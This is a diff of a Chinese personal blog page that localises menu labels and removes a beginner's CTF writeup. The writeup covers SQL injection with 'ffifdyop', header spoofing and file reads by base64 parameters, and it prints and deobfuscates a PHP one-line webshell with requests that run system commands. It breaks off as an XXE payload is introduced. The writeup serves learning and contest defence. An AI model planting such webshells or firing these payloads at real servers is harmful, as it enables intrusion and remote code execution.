@@ -85,7 +85,7 @@
             
             <li class="menu-item">
                 <a href="/">
-                    Home
+                    首页
                 </a>
             </li>
             
@@ -97,19 +97,19 @@
             
             <li class="menu-item">
                 <a href="/about.html">
-                    About
+                    关于
                 </a>
             </li>
             
             <li class="menu-item">
                 <a href="/tags">
-                    Tags
+                    标签
                 </a>
             </li>
             
             <li class="menu-item">
                 <a href="/categories">
-                    Categories
+                    目录
                 </a>
             </li>
             
@@ -145,260 +145,6 @@
 </header>
 
         <section class="main">
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2019/07/07/CTF-writeup/">
-                CTF writeup
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2019-07-07</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><a href="http://whoisyourdaddy.cf" target="_blank" rel="noopener"><font size="5" color="blue">首页</font> </a></p>
-<p>#CTF WriteUP<br><font size="4" color="red" face="楷体">Made By YJN</font></p>
-<p><img src="http://whoisyourdaddy.cf/picture/640.gif" alt></p>
-<div>
-<br><br><br><br>
-<font size="2" color="green">
-都是菜鸡总结的一点常识, 大佬请绕路(发抖)<br>
-但是也欢迎大佬纠正错误, 批评指导<br>
-菜鸡不胜感激<br>
-</font>
-</div>
-<br>
-[toc]
-##WEB
-###[localhost](http://web.jarvisoj.com:32774/)(resolved)
-
-<p>题目中只有一行 <strong>localhost access only!!</strong><br><a href="https://link.jianshu.com/?t=http://www.111cn.net/phper/php-cy/59523.htm" target="_blank" rel="noopener">PHP获取用户IP地址</a><br>所以需要伪造自己的IP地址<br>一个比较简单的方法是在HTTP的请求头中添加参数:<code>X-Forwarded-For : 需要伪造的IP</code><br>可以使用burp suite抓包或PostMan来实现<br><img src="http://whoisyourdaddy.cf/picture/X-Forwarded-For.png" alt><br>类似的, 可以伪造<code>Referer</code><br><code>Referer</code>表明了用户是从哪个页面跳转来的.<br>例如<br><code>Referer: https://www.google.com</code></p>
-<p>###<a href="http://web.jarvisoj.com:32792/" target="_blank" rel="noopener">admin</a>(resolved)</p>
-<p>进入网页只有一个hello world<br>查看网页代码,没有线索<br>尝试robots.txt,网页跳转,但是出现了一个假flag<br>burp suite抓包, 修改参数admin = 1,follow后出现真的flag</p>
-<p>###<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">login</a>(working)</p>
-<p>进入题目只有一个登陆框，<br>右键源码，发现密码校验不在本地，<br>使用BurpSuite在后台密码爆破，<br>同时尝试使用 sql 注入<br>输入 <code>1&#39;or&#39;1&#39;or&#39;1</code>,<br>得到一个奇怪的响应,</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /opt/lampp/htdocs/index.php on line 14</span><br><span class="line">Wrong Password.</span><br></pre></td></tr></table></figure>
-
-<p>正当百思不得其解时,<br>查看下爆破时的 response 包,竟然有提示</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: &quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</span><br></pre></td></tr></table></figure>
-
-<p>关于md5(string,raw)函数:</p>
-<ul>
-<li>string必需, 规定要计算的字符串</li>
-<li>raw可选, 规定十六进制或二进制输出格式(TRUE或FALSE)</li>
-</ul>
-<p>2019/7/4日 补充:<br>原来hint里已经说的很清楚了, 就是先把我们的参数md5加密后再执行查询.<br>如果我们想构造payload, 需要使 md5($pass,true) 的结果中出现 <code>&#39;or&#39;</code> , 才可能绕过.<br>针对这个问题, 已经有了现成的payload – <code>ffifdyop</code><br>这是因为 :<br>MD5(‘ffifdyop’) =&gt; <code>276f722736c95d99e921722cf9ed621c</code>  #md5加密<br><code>276f722736c95d99e921722cf9ed621c</code> =&gt;  ‘or’6&lt;乱码&gt;     #转为字符串</p>
-<p>###<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">神盾局的秘密</a>(working)<br>进入题目, 在开发者工具中发现有代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>传给img的参数是被base64加密过了,<br>所以如果我们想利用这个参数搞事,也必须先用base64加密</p>
-<p>首先对 <code>index.php</code> 加密得到 <code>aW5kZXgucGhw</code><br>将它作为参数传给URL:<br><code>http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw</code><br>返回的页面中有代码 :</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php </span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">	$x = <span class="keyword">new</span> Shield();</span><br><span class="line">	<span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">		$x = unserialize($g);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">echo</span> $x---&gt;</span><br></pre></td></tr></table></figure>
-
-<p>既然从url中看出有个文件名字叫<code>showimg.php</code>, 以同样的方法将其作为参数,访问url:<code>http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=</code><br>也有代码 :</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php</span><br><span class="line">	$f = $_GET[<span class="string">'img'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">		$f = base64_decode($f);</span><br><span class="line">		<span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></span><br><span class="line">		&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">			readfile($f);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?--&gt;</span><br></pre></td></tr></table></figure>
-
-<p>然而暂时还不懂代码的逻辑, 回来再说</p>
-<p>###<a href="http://web.jarvisoj.com:32780/index.phps" target="_blank" rel="noopener">IN A MESS</a>(working)<br>进入题目只有一句 <code>work harder!harder!harder!</code><br>观察url有个参数id,不管怎样,<br>先后台爆着再说.<br>然而并没有什么卵用.<br>看response包里,有个index.phps <em>一开始我根本没看出来和index.php不一样</em> :/<br>访问,有如下代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">'Location: index.php?id=1'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>构造payload比较复杂, 回再说吧</p>
-<p><a href="https://www.cnblogs.com/baifan2618/p/7815090.html" target="_blank" rel="noopener">参考</a></p>
-<p>###<a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">PORT51</a>(resolved)<br>根据题目, 应该是需要以指定的51端口访问.<br>在本地cmd</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --local-port 51 http://web.jarvisoj.com:32770/</span><br></pre></td></tr></table></figure>
-
-<p>并没有什么卵用, 得到的响应和在浏览器上没区别,<br>但是使用服务器, 输入同样的命令可以成功, 暂时存疑<br>反正,<br>flag 拿到了对吧 :(</p>
-<p>###TSCTF(resolved)</p>
-<p><img src="http://whoisyourdaddy.cf/picture/TSCTF.jpeg" alt></p>
-<p>这应该算是我第一次参见比较正式的CTF线下赛吧</p>
-<p>能得奖基本就是靠抱大腿</p>
-<p>没什么想多说的</p>
-<p>只希望明年这天</p>
-<p>我是D.I.E的主力</p>
-<p>####流量监听</p>
-<p>打算在比赛时可以通过监听工具,抓取自家服务器的流量,<br>就算题目没有头绪, 还可以分析一波别人的 payload.</p>
-<p><strong>tshark</strong><br>需要先自行安装一下.<br><strong>基本每个命令都需要root权限<code>sudo</code></strong></p>
-<ul>
-<li>显示可用网卡 <code>tshark -D</code></li>
-<li>抓包  使用命令 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tshark  -c [数字]  -w [文件名.pcap] -f [捕获过滤器]</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">+ -c 表示抓多少包后停止</span><br><span class="line">+ -w 把抓包结果输入到文件中, 无需提前创建, 若目录下没有, 自动创建</span><br><span class="line">+ -f 设置捕获过滤器, 我们此处主要针对http的数据包, 所以参数设定为 &quot;port 80&quot;</span><br><span class="line"></span><br><span class="line">但是根据我的试验, 凡是使用tshark后产生的文件权限都十分敏感, 没法用finalshell 直接下载, 为了方便起见, 再补充使用 tcpdump 的方法</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p>tcpdump -s  [数字]  -w [文件.pcap] port [端口数]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">+ -s 表示一个包截断的长度, 0表示不截断, 完整的保存下来</span><br><span class="line">+ -w 输入到文件</span><br><span class="line">+ port 监听的端口</span><br><span class="line"></span><br><span class="line">**使用 tcpdump 同样需要sudo**</span><br><span class="line">然而这场比赛没有root权限, 自然也就没法用sudo, 我, , ,</span><br><span class="line"></span><br><span class="line">####自动提交 flag 的 python 脚本</span><br><span class="line"></span><br><span class="line">```py</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">def submit(flag, token):                           # 定义函数 submit</span><br><span class="line">	url = &quot;wangzhi&quot;                            # 需要设置的参数  url</span><br><span class="line">	pos = &#123;                                    # 字典，python的一种可变容器模型</span><br><span class="line">	    &quot;flag&quot;:flag,</span><br><span class="line">	    &quot;token&quot;:token</span><br><span class="line">	&#125;                                          # 所以 pos[&quot;flag&quot;] = flag</span><br><span class="line">	print &quot;[+] Submiting flag : [%s]&quot; % (pos)  # 格式化输出 pos</span><br><span class="line">	response = requests.post(url,data=pos)     # response 接收 request.post()返回的对象(?),其有许多数据域</span><br><span class="line">	content = response.content                 # content 接收 response的数据域content, 二进制数据</span><br><span class="line">	print &quot;[+] Content : %s &quot; % (content)      # 格式化输出content</span><br><span class="line">	if failed in content:                      # 若成功提交, 返回True,反之返回False</span><br><span class="line">		print &quot;[-]failed&quot;</span><br><span class="line">		return False</span><br><span class="line">	else:</span><br><span class="line">		print &quot;[+] Success!&quot;            </span><br><span class="line">		return True</span><br></pre></td></tr></table></figure>
-
-<p>然而目前我的python环境还有点问题, 暂时没法正常运行<br>装了python3, 又装python2<br>装python一时爽,<br>一直装一直爽 😭</p>
-<p>####第一个漏洞</p>
-<p>开局登陆进主机后, 迅速使用下载整个网络目录到本地<br>D盾扫描出一个高危文件!<code>.202cb962ac59075b964b07152d234b70.ini.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_=<span class="string">'s'</span>.<span class="string">'s'</span>.<span class="comment">/*-/*-*/</span><span class="string">'e'</span>.<span class="comment">/*-/*-*/</span><span class="string">'r'</span>;</span><br><span class="line">@$_=<span class="comment">/*-/*-*/</span><span class="string">'a'</span>.<span class="comment">/*-/*-*/</span>$_.<span class="comment">/*-/*-*/</span><span class="string">'t'</span>;</span><br><span class="line">@$_<span class="comment">/*-/*-*/</span>($<span class="comment">/*-/*-*/</span>&#123;<span class="string">'_P'</span>.<span class="comment">/*-/*-*/</span><span class="string">'OS'</span>.<span class="comment">/*-/*-*/</span><span class="string">'T'</span>&#125;</span><br><span class="line">[<span class="comment">/*-/*-*/</span><span class="number">0</span><span class="comment">/*-/*-*/</span>+<span class="comment">/*-/*-*/</span><span class="number">3</span><span class="comment">/*-/*-*/</span>+<span class="comment">/*-/*-*/</span><span class="number">3</span><span class="comment">/*-/*-*/</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这个文件当时没有看懂，但是现在经过学长的指点有点清晰了<br>其实代码中有着大量的障眼法<br>首先是大量的注释，把它们去掉后</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_=<span class="string">'s'</span>.<span class="string">'s'</span>.<span class="string">'e'</span>.<span class="string">'r'</span>;</span><br><span class="line">@$_=<span class="string">'a'</span>.$_.<span class="string">'t'</span>;</span><br><span class="line">@$_($&#123;<span class="string">'_P'</span>.<span class="string">'OS'</span>.<span class="string">'T'</span>&#125;</span><br><span class="line">[<span class="number">0</span>+<span class="number">3</span>+<span class="number">3</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>其实这里看出仍有很多拼接运算在阻碍我们分析,<br>我们直接写出拼接后的结果</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_=<span class="string">'assert'</span>;</span><br><span class="line">@$_($&#123;<span class="string">'_POST'</span>&#125;[<span class="number">6</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>我们看到,这两行代码中都有变量<code>$_</code>,<br>起初我不知道这是什么意思, 其实就是相当于文本的替换<br>因为<code>$_</code>存放的是字符串, 所以php的解释器在分析时也仅仅是把内容原封不动的放在这里<br>那么这段代码就是</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @assert($_POST[<span class="number">6</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>而一句话木马<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code><br>其中assert()和eval()的效果类似<br>所以这个文件里就是暗藏一句话木马!</p>
-<p>####一句话木马的原理<br>之前使用一句话木马也有好几次了,<br>但是基本都是用菜刀直连, 却对它的原理不甚了解.<br>借这个机会赶紧把php的一些细节上的东西搞清楚.</p>
-<p>常见的一句话木马</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p><strong>eval()函数</strong> : 会把里面的变量当成php代码来执行.<br>如果说 <code>$_post[&#39;cmd&#39;]</code> 此时的值是<code>print &#39;hello world&#39;</code>, 那么它运行起来的回显就是<code>hello world</code><br>如果<code>%_post[&#39;cmd&#39;]</code>的值是<code>system(&#39;cat flag&#39;)</code>, 那么在服务器端就会执行<code>cat flag</code>命令并在浏览器上回显<br>也就是说, 连接上了一句话, 你就可以用这个函数随便<del>做爱做的事情</del>搞事, 前提是有足够的权限</p>
-</li>
-<li><p><strong>$_post[‘cmd’]</strong> : 一句话的目的是执行我们的命令, 那么它就需要一个变量来接收我们传来的数据, $_post[‘cmd’]就是干这个的, 它会从http的POST数据包中接收一个名为<code>cmd</code>的参数.<br>问题是, 如果这个一句话木马是别人植入的, 那我就不知道这个参数的名字是什么, 也就无法正确的<del>做爱做的事</del>传参. 所以这里的参数名又起到了密码的作用, 让我们的一句话只为自己所用.</p>
-</li>
-<li><p><strong>@</strong> 符号的作用是 : 如果代码错误执行, 不把报错信息显示出来.<br>为什么要这样做呢? 因为假如我们不传参数执行代码, 那么服务器就会善意的报错:</p>
-<blockquote>
-<p>Notice，你的cmd变量没有定义。</p>
-</blockquote>
-<p>于是密码就被服务器暴露了.<br>@ 就可以避免这种尴尬的场面</p>
-</li>
-</ul>
-<p>其实我觉得上来就用菜刀控制一句话木马并不好,<br>因为这个工具把底层的东西都封装好了.<br>我深信, 要想真正理解某样东西, 越接近底层, 越有助于深入.<br>所以要先学会<strong>使用浏览器连接一句话木马</strong></p>
-<p>在比赛的时候, 见到学长在url上设置payload,<br>所以我想设置url的payload连接一句话,<br><code>http://whoisyourdaddy.cf/test.php?cmd=system(&#39;ls&#39;);</code><br>按照我们上面的分析, php代码就会执行<code>system(&#39;ls&#39;);</code>, 回显出目录下的文件.<br>(一定不要忘记后面的 <code>;</code>血的教训😭)<br><font size="5"><strong>然而 :</strong></font><br><img src="http://whoisyourdaddy.cf/picture/kongkongde.png" alt></p>
-<p>这是因为, <strong>$_post根本不接收用GET方法传来的参数!</strong><br>$_post只接收使用POST方法接受的表单数据.</p>
-<p>简单起见, 我们先用url作为payload, 那么, 需要把代码改成</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>访问一下.<br><img src="http://whoisyourdaddy.cf/picture/ls.png" alt><br>成功了.</p>
-<p>同理, 要想使用POST方法传递数据, 可以用</p>
-<ul>
-<li>Chrome 的插件 Hackbar</li>
-<li>Burp Suite change method</li>
-<li>Post man 生成 payload</li>
-</ul>
-<p>我成功的使用Burp 的 change method 功能和 PostMan 实现了.<br>postman的使用有些坑要注意, 如图<br><img src="http://whoisyourdaddy.cf/picture/postman.png" alt></p>
-<p>####POST和GET数据包的对比<br>GET:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /test.php?cmd=system(%27ls%27); HTTP/1.1</span><br><span class="line">Host: whoisyourdaddy.cf</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
-
-<p>POST:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /test.php HTTP/1.1</span><br><span class="line">Host: whoisyourdaddy.cf</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 21</span><br><span class="line"></span><br><span class="line">cmd=system(%27ls%27);</span><br></pre></td></tr></table></figure>
-
-<p>一句话木马先分析到这里.</p>
-<p>####其他漏洞<br>由于线下赛的服务器在比赛结束后就关闭了, 很多题目也不方便复现.<br>主要说一下思路就好了</p>
-<ul>
-<li>web1<br>前面的一句话木马已经分析过了,<br>其修补漏洞的方法也很简单 : 直接删除木马文件, 一了百了.<br>除了上面的一句话漏洞, 还有针对finecms的任意文件读取漏洞<br>我认为这个漏洞的根源是url过滤不够严格<br>题目一开始的代码只替换<code>../</code>为<code></code>,<br>修补方式是, 循环替换<code>../</code>, 让不法分子无机可乘<br><img src="http://whoisyourdaddy.cf/picture/welcome.png" alt="web1的logo,真的很皮"><br><del>这段代码, 我修的 (叉腰)</del></li>
-<li>web2<br>在题目给的站的某处, 可以上传图片,<br>但是对文件格式的检测却很宽松.<br>保存着上传图片的地方也没有限制访问.<br>直接图片马走起安排.<br>可以参考 <a href="http://whoisyourdaddy.cf/渗透测试&上传漏洞.html" target="_blank" rel="noopener">渗透测试&amp;上传漏洞</a></li>
-<li>至于pwn1和pwn2 , , , 打扰了打扰了</li>
-</ul>
-<h3 id="api调用-resolved"><a href="#api调用-resolved" class="headerlink" title="api调用(resolved)"></a><a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">api调用</a>(resolved)</h3><p>这道题利用的是xxe漏洞<br>那么<a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">什么是xxe漏洞呢?</a></p>
-<blockquote>
-<p>简单来说，XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p>
-</blockquote>
-<p><font size="2">咳, 这说的一点也不简单啊(小声bb) </font><br>对着其中几个陌生的名词来学习下:</p>
-<ul>
-<li><p>XML : </p>
-<blockquote>
-<p>可扩展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言。</p>
-</blockquote>
-<p>  根据我自己的理解, 应该就是一种可以<strong>方便计算机理解</strong>的, 使<strong>内部数据具有清晰逻辑结构</strong>的一种<strong>标记语言</strong><br>  示例代码如下: </p>
-  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /vulnerable HTTP/1.1</span><br><span class="line">Host: www.test.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Referer: https://test.com/test.html</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 294</span><br><span class="line">Cookie: mycookie=cookies;</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">"test101"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>XML is the best!<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>语法上:<br>这段代码中定义了一个根元素–<code>catalog</code>, <code>id</code>是<code>core</code>的一个属性, <code>author</code>和<code>title</code>则是<code>core</code>的子元素, <code>core</code>是<code>catalog</code>的子元素</p>
-</li>
-<li><p>功能上:<br>注意看代码的开头部分, 是POST方法的<strong>Header</strong>. 所以其实这段代码本质上仍然是一个<strong>POST方法的http数据包</strong>, 本质上和我们之前分析的post|get数据包没区别. 其作用无非是向服务器提交一份数据而已. 至于怎么处理, 那就看服务端的程序是怎样的了</p>
-<br>  </li>
-</ul>
-</li>
-<li><p><strong>允许引用外部实体</strong> :<br>  不过, 如果是下面的这段代码, 就会成为所谓的恶意payload, 如下:</p>
